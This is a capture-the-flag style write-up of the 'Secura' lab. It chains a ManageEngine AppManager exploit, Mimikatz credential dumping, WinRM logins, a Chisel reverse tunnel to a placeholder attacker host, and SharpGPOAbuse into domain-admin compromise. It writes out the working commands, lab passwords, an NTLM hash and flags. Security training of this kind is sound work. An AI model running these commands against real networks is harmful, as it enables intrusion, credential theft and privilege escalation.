# Secura Challenge Lab

## Targets
| IP | Hostname | Role | Priority Ports |
|----|----------|------|----------------|
| 192.168.179.95 | SECURE | App Server | 8443 (AppManager), 5985, 3389 |
| 192.168.179.96 | ERA | DB Server | 3306 (MariaDB 10.3.24), 5985 |
| 192.168.179.97 | DC01 | Domain Controller | 88, 389, 445, 5985 |

## Domain Info
- **Domain:** secura.yzx
- **DC:** DC01.secura.yzx

## Attack Surface Priority
1. **ManageEngine AppManager** (.95:8443) - Known CVEs, web app
2. **MariaDB** (.96:3306) - Default creds, injection
3. **SMB** (all hosts) - Null sessions, shares
4. **AD** - Kerberoasting, AS-REP roasting once creds obtained

## Credentials Found
| Username | Password | Source | Access |
|----------|----------|--------|--------|
| Administrator (local) | NTLM: a51493b0b06e5e35f855245e71af1d14 | Mimikatz on .95 | .95 local admin |
| apache | New2Era4.! | Credential Manager on .95 (era.secura.local) | .96 local admin (WinRM) |
| ERIC.WALLOWS | EricLikesRunning800 | Found on .95 | Domain user (secura.yzx) |
| administrator | Almost4There8.? | MySQL creds.creds table on .96 | .96 local admin (WinRM) ✓ |
| charlotte | Game2On4.! | MySQL creds.creds table on .96 | .97 DC01 Admin via GPO abuse ✓ |

## Attack Chain Progress

### .95 (SECURE) - COMPROMISED ✓
1. Exploited ManageEngine AppManager
2. Obtained local Administrator access
3. Ran Mimikatz - extracted credentials from memory and Credential Manager

### .96 (ERA) - COMPROMISED ✓
1. Direct MariaDB connection blocked (host ACL - only localhost allowed)
2. Tried apache creds via domain auth - FAILED
3. **SUCCESS:** `crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' --local-auth` → (Pwn3d!)
4. Shell: `evil-winrm -i 192.168.179.96 -u apache -p 'New2Era4.!'`

**Key Lesson:** The credential was for a LOCAL account on ERA, not a domain account. `--local-auth` flag was critical.

#### MySQL Access via Chisel Tunnel
1. Uploaded chisel.exe to ERA
2. Started chisel server on Kali: `chisel server -p 8080 --reverse`
3. Connected from ERA: `.\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306`
4. MySQL root access with **no password**: `mysql -h 127.0.0.1 -P 3306 -u root`

**Databases Found:**
- `creds` ← HIGH VALUE TARGET
- `information_schema`
- `mysql`
- `performance_schema`
- `phpmyadmin`
- `test`

**MySQL Users:**
| User | Host |
|------|------|
| root | 127.0.0.1 |
| root | ::1 |
| pma | localhost |
| root | localhost |

**Key Lesson:** MySQL only allowed localhost connections. Chisel port forwarding bypassed this by tunneling 3306 to Kali.

**Credentials Extracted from MySQL:**
```sql
MariaDB [creds]> SELECT * FROM creds;
+---------------+-----------------+
| name          | pass            |
+---------------+-----------------+
| administrator | Almost4There8.? |
| charlotte     | Game2On4.!      |
+---------------+-----------------+
```

#### Privilege Escalation to Administrator
- Used `administrator:Almost4There8.?` from MySQL dump
- `evil-winrm -i 192.168.179.96 -u administrator -p 'Almost4There8.?'`
- **proof.txt:** `15ee635f37d616dcaf16f72438337a4f`

### .97 (DC01) - COMPROMISED ✓
1. Used `charlotte:Game2On4.!` from MySQL dump on .96
2. Initial access: `evil-winrm -i 192.168.179.97 -u charlotte -p 'Game2On4.!'`
3. Enumerated GPO permissions: `icacls "\\secura.yzx\SYSVOL\secura.yzx\Policies\*"`
4. Found charlotte has **Full Control (F)** on Default Domain Policy `{31B2F340-016D-11D2-945F-00C04FB984F9}`
5. Used **SharpGPOAbuse** to add charlotte to local Administrators:
   ```
   .\sharp.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
   gpupdate /force
   ```
6. Reconnected to get new token with admin privileges
7. **proof.txt:** `eba9a0263085d2fd447f7e91e12609af`

**Key Lesson:** GPO permissions are often overlooked. Check SYSVOL ACLs for write access - if a user can modify a GPO, they can escalate to Domain Admin.

## Flags
| Host | Type | Flag |
|------|------|------|
| .95 | local.txt | |
| .95 | proof.txt | |
| .96 | local.txt | ef117abaa23acf3a58fdea7c6891f11a |
| .96 | proof.txt | 15ee635f37d616dcaf16f72438337a4f |
| .97 | local.txt | 931153bd267dd40e90d930e4e9486430 |
| .97 | proof.txt | eba9a0263085d2fd447f7e91e12609af |

## Current Phase
**COMPLETE** - All three machines compromised

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SECURA CHALLENGE LAB - COMPLETE                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  .95 (SECURE)          .96 (ERA)              .97 (DC01)                   │
│  ┌──────────┐          ┌──────────┐           ┌──────────┐                 │
│  │AppManager│ exploit  │  MySQL   │ creds     │   GPO    │                 │
│  │  8443    │────────▶│  3306    │─────────▶│  Abuse   │                 │
│  └──────────┘          └──────────┘           └──────────┘                 │
│       │                     │                      │                        │
│       ▼                     ▼                      ▼                        │
│  Mimikatz             Chisel Tunnel          SharpGPOAbuse                 │
│  ─────────            ─────────────          ──────────────                │
│  apache creds         root no-pass           charlotte → Admin            │
│  era.secura.local     creds database         Default Domain Policy        │
│       │                     │                      │                        │
│       ▼                     ▼                      ▼                        │
│  WinRM .96            administrator          Domain Admin                  │
│  (local auth)         charlotte creds        proof.txt ✓                   │
│                            │                                               │
│                            ▼                                               │
│                       proof.txt ✓                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Key Techniques Used

| Technique | Tool/Method | Target |
|-----------|-------------|--------|
| Web App Exploit | ManageEngine AppManager CVE | .95 |
| Credential Extraction | Mimikatz + Credential Manager | .95 |
| Local Auth vs Domain Auth | `--local-auth` flag | .96 |
| Port Forwarding | Chisel reverse tunnel | .96 MySQL |
| Default Credentials | MySQL root (no password) | .96 |
| Database Credential Dump | MySQL creds table | .96 |
| GPO ACL Enumeration | icacls on SYSVOL | .97 |
| GPO Abuse | SharpGPOAbuse --AddLocalAdmin | .97 |

## Lessons Learned

1. **Local vs Domain Auth**: Always try both `--local-auth` and domain auth when testing credentials
2. **MySQL Default Creds**: XAMPP/WAMP installations often have root with no password
3. **Tunnel for Localhost Services**: Use chisel when services only bind to 127.0.0.1
4. **Credential Reuse**: Database credentials often match system accounts
5. **GPO Permissions**: Check SYSVOL ACLs - write access = Domain Admin path
6. **Token Refresh**: After group membership changes, reconnect to get new token
